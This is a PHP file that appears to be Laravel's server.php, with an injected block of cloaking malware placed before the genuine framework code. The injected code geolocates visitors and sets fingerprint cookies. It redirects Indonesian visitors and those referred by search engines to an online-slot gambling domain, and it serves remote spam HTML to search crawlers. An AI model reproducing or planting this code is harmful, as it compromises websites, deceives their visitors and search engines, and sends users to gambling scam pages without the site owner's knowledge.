<?php
function getClientIP() {
    $headers = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    foreach ($headers as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            foreach ($ipList as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
    }
    return '127.0.0.1';
}

function getUrlContent($url) {
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
        if ($content !== false) return $content;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response ?: '';
}

function isBot() {
    $botKeywords = ['googlebot', 'slurp', 'adsense', 'inspection', 'verifycation', 'jenifer'];
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    foreach ($botKeywords as $bot) {
        if (strpos($ua, $bot) !== false) return true;
    }
    return false;
}

$ip = getClientIP();
$geoData = json_decode(getUrlContent("http://ip-api.com/json/{$ip}"), true);
$countryCode = $geoData['countryCode'] ?? '';

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$fingerprint = sha1($ip . $ua);

if (!isset($_COOKIE['user_fp']) && $countryCode === 'ID') {
    setcookie('user_fp', $fingerprint, time() + 86400 * 30, '/');
    $_COOKIE['user_fp'] = $fingerprint;
}

$allowedFingerprint = $_COOKIE['user_fp'] ?? '';

$redirectURL = 'https://agenresmislotgacorsitoto.com/truongcaodang/index.html/';

if ($countryCode === 'ID' && $fingerprint === $allowedFingerprint && $allowedFingerprint !== '') {
    header("Location: $redirectURL");
    exit;
}

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$refererDomains = ['google.co.id', 'yahoo.co.id', 'bing.com'];
foreach ($refererDomains as $domain) {
    if (stripos($referer, $domain) !== false) {
        header("Location: $redirectURL");
        exit;
    }
}

if (isBot()) {
    $htmlURL = 'https://agenresmislotgacorsitoto.com/truongcaodang/page.html/';
    echo getUrlContent($htmlURL);
    exit;
}

?>
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylorotwell@gmail.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}
require_once __DIR__.'/public/index.php';